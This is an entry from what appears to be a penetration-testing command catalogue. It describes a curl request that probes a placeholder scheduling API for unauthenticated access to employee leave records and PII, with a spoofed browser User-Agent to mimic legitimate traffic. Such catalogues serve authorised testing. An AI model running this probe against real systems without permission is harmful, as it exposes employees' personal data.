---
data: >-
  curl -X GET "https://api.target-domain.com/scheduling/leave?employee_id=123"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  -H "Accept: application/json"
tags:
  - api
  - recon
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.428Z'
id: d7f82baf-be7c-4796-b51e-345b21806c60
verified: false
validated: true
submitted: true
---
# curl-retrieve-api-data

## Command

```bash
curl -X GET "https://api.target-domain.com/scheduling/leave?employee_id=123" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: application/json"
```

## Description

This command uses curl to perform an unauthenticated GET request to an API endpoint, retrieving sensitive data such as employee PII from a scheduling system. It is used in scenarios where endpoints lack authentication to test for information disclosure vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://api.target-domain.com/scheduling/leave?employee_id=123"` | The target API URL with query parameters for data retrieval | Yes |
| `-H "User-Agent: ..."` | Sets a browser-like User-Agent header to mimic legitimate traffic | No |
| `-H "Accept: application/json"` | Requests JSON response format | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.target-domain.com/scheduling/leave?employee_id=123"
```

### Advanced Usage

```bash
curl -X GET "https://api.target-domain.com/scheduling/leave?employee_id=123" -H "User-Agent: Mozilla/5.0" -H "Accept: application/json" -o output.json
```

## Expected Output

A JSON object containing employee data, such as {"employee_id": "123", "name": "John Doe", "leave_dates": ["2023-10-15"]}. If successful, no authentication errors occur; failures may return 401 or empty responses.

## Related

- [[Related Procedure: Discover-and-Access-Unauthenticated-API-Endpoint]]
